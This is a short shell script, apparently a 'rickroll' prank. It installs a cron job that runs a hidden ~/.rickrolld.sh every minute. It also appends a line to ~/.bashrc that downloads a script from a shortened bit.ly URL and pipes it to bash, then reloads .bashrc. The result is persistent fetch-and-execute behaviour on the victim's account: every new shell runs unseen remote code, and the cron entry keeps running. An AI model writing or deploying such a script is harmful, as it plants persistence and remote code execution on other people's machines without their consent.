#!/bin/sh


# Check if script is already on crontab
crontab -l | grep -qxF '* * * * * env USER=$LOGNAME /home/$LOGNAME/.rickrolld.sh'

# If the last command returned something different from 0 (not successful), append line to crontab
if [ $? -ne 0 ]; then
    # Preserving contents already on crontab
    (crontab -l ; echo '* * * * * env USER=$LOGNAME /home/$LOGNAME/.rickrolld.sh')| crontab -
fi

# Put Rick Roll on .bashrc if it's not already there and reload .bashrc
grep -qxF 'curl -L http://bit.ly/10hA8iC | bash' /home/$USER/.bashrc || echo 'curl -L http://bit.ly/10hA8iC | bash' >> /home/$USER/.bashrc && source /home/$USER/.bashrc